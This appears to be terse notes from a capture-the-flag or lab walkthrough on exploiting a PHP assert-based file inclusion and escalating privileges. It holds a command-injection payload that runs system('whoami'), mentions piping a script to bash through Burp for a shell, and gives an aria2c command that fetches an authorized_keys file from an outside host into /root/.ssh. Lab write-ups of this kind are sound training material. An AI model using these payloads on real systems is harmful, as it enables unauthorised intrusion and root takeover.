we found place for lfi but no payload was working ..now weÂ  used assert lfi

```
' and die(system("whoami")) or '
```

we can make a sh file in our pc and pipe it as bash in burp to get shell

now priv esc was as suid was set for aria2c

/usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "http://192.168.49.119:8000/authorized_keys" --allow-overwrite=true
